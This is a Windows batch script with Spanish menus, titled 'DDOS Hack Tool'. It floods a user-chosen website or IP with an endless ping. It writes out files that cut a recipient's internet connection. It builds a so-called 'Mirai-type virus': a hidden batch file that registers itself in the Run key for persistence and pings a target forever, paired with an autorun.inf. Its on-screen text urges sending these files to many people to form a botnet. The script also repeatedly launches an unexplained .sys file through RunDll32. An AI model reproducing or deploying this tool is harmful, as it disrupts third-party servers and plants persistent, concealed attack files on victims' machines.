:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::
:: ----------------------------------------------------------------------------------- DDOS Hack Tool --------------------------------------------------------------------------- ::
:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::
:: ------------------------------------------------------------------------------- Copyright: Dharkon SK ------------------------------------------------------------------------ ::
:: ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ::

@echo off
title DDOS Hack Tool
color a
cd SystemDDOS >nul
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc0) >nul
goto Inicio

:Error0x0cc0
cls
color f
echo(
echo( DDOS Hack Tool no ha Iniciado porque El Siguiente Archivo Falta o esta 
echo( Corrupto: [-Ubicacion-]\SystemDDOS\ADZP 20 Complex.sys
echo( Reinstale una Copia del Archivo Mencionado
pause >nul
exit

:Error0x0cc20
cls
color f
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                                                           !
echo.
echo                                      El Programa se ha Cerrado Debido a un Error
echo.
pause >nul
exit

:Inicio
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
color a
echo(
echo(
echo(             ==========================================================================================
echo(                               DDOS Hack Tool                                                          
echo(             =================================================== 1 = Ataque a una Pagina web           
echo(                       Bienvenido, Con esta Herramienta          2 = Anular la Conexion de Internet en 
echo(                       Puede Realizar Ataques DDOS a un              un Dispositivo                    
echo(                       Servidor con un Maximo de 65500           3 = Mas Funciones de la Aplicacion    
echo(                       Bytes por Segundo.                                                              
echo(             ==========================================================================================
set /p id=" *            Ingrese la ID: "
if %id% == 1 (goto DDOS)
if %id% == 2 (goto EthernetKiller)
if %id% == 3 (goto More)

:IDError1
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
msg * La ID no es Valida
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Inicio

:DDOS
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
set /p ip= Ingrese la IP o URL de el Sitio web que quiere atacar: 
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
set /p bytes= Ingrese la Cantidad de Bytes con la que Quiere Atacar la Web: 
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo. ===============================
echo.  Preparando Ataque DDOS...     
echo. ===============================
timeout /t 3 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.  Preparando Paquetes...        
echo. ===============================
timeout /t 3 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.  Conectando con el Servidor... 
echo. ===============================
timeout /t 3 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
ping %ip% -n 1 >nul
IF NOT ERRORLEVEL 1 (GOTO ATTACK) else (GOTO ERROR0X0CC18) >nul

:Attack
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo ==========================================
echo.  Atacando a %ip%...
echo ==========================================
echo.  Para Detener el Ataque DDOS al Sitio
echo.  Web presione Control + C y se Detendran
echo.  Todos los Procesos de Ataque.
echo ==========================================
ping %ip% -t -l %bytes%
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Inicio

:Error0x0cc18
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.                               =============================================
echo.                                 No se Puede Establecer Conexion para poder 
echo.                                 Realizar el Ataque DDOS                    
echo.                               =============================================
echo.                                          Verifique lo Siguiente            
echo.                               =============================================
echo.                                * Si hay Conexion a Internet                
echo.                               =============================================
echo.                                * Que un Cortafuegos no este Bloqueando la  
echo.                                  Conexion a Internet                       
echo.                               =============================================
echo.                                * Que la IP o URL esten Correctamente       
echo.                                  Escritas                                  
echo.                               =============================================
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Inicio


:EthernetKiller
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
echo.
echo.
set /p name= Antes de crear el Archivo Ingrese el Nombre que quiere Asignarle: 
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo @echo off>>%name%.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v EthernetKiller /t REG_SZ /d "%name%.bat"
echo Ipconfig /release>>%name%.bat
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
echo.
echo.
echo.    Se Acaba de Crear un Archivo que Anula el Internet, Puede Enviar este Archivo a alguien para Anular su Conexion
echo.                                                  a Internet
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Inicio

:More
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo(
echo(
echo(                 =================================================================================
echo(                                DDOS Hack Tool                                                    
echo(                 =========================================== 1 = Ver Configuracion de la Red      
echo(                      Estas son Algunas de las Funciones     2 = Solucionar Problemas de Conexion 
echo(                      de las Funciones Adicionales de la     3 = Anular la Conexion a Internet     
echo(                      Aplicacion para poder Solucionar       4 = Crear Virus de Tipo Mirai         
echo(                      Problemas de Conexion y Facilitar      5 = Informacion Sobre Redes          
echo(                      El Hackeo en Las Redes tanto Redes     6 = Volver al Inicio                 
echo(                      Publicas como Redes Privadas.                                               
echo(                 =================================================================================
set /p opcion=" *                Ingrese la ID: "
if %opcion% == 1 (goto Settings)
if %opcion% == 2 (goto Repair)
if %opcion% == 3 (goto EthernetKill)
if %opcion% == 4 (goto Mirai)
if %opcion% == 5 (goto EthernetSpy)
if %opcion% == 6 (goto Inicio)

:IDError2
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
msg * La ID no es Valida
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:Settings
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
ipconfig
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:Repair
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
echo                  ================================================================================
echo                       Solucionar Problemas de Conexion                                           
echo                  ========================================= 1 = Reparar la Conexion a Internet    
echo                    Si su Conexion a Internet no Funciona   2 = Reiniciar la Conexion a Internet  
echo                    Puede usar el Sistema de Reparacion     3 = Volver al Inicio                  
echo                    de Internet para Restaurarla                                                  
echo                  ================================================================================
set /p repair=" *                Ingrese la ID: "
if %repair% == 1 (goto EthernetRepair)
if %repair% == 2 (goto EthernetReset)
if %repair% == 3 (goto More)

:IDError3
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
msg * La ID no es Valida
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:EthernetRepair
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.                                        Reparando la Conexion a Internet...
timeout /t 5 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
ipconfig /renew
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:EthernetReset
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
ipconfig /release >nul
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
echo.
echo.
echo.                                       Reiniciando la Conexion a Internet...
timeout /t 5 >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
ipconfig /renew
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto Repair

:EthernetKill
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
ipconfig /release
msg * Se ha Anulado la Conexion a Internet
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:Mirai
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
echo.
set /p name=" Ingrese el Nombre que Desea Asignarle al Archivo: "
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
set /p ip= Ingrese la IP o URL de el Sitio web que quiere atacar: 
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
set /p bytes= Ingrese la Cantidad de Bytes con la que Quiere Atacar la Web: 
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
if exist %name%.bat (del /f /q /s %name%.bat & RunDll32 "ADZP 20 Complex.sys") else (echo.)
if exist DDOS-Autorun.inf (del /f /q /s DDOS-Aurorun.inf & RunDll32 "ADZP 20 Complex.sys") else (echo.) 
echo off>>"%name%".bat
echo @echo off>>"%name%.bat"
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v DDOS /t REG_SZ /d "%name%.bat">>%name%.bat
echo attrib +h "%name%.bat">>"%name%.bat"
echo ping %ip% -t -l %bytes%>>"%name%.bat"
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo off>>DDOS-Autorun.inf
cls
echo [Autorun]>>DDOS-Autorun.inf
echo Open=%name%.bat>>DDOS-Autorun.inf
echo Action=Start %name%>>DDOS-Autorun.inf
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.   Se Acaban de Crear 2 Archivos que Ejecutan Ataques DDOS, Puede Enviar estos Archivos a Multiples Personas para
echo.                                  Crear una Botnet que Ataque a la IP especificada
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More

:EthernetSpy
cls
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
echo.
echo.
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
netsh wlan show profile
pause >nul
if exist "ADZP 20 Complex.sys" (RunDll32 "ADZP 20 Complex.sys") else (goto Error0x0cc20) >nul
goto More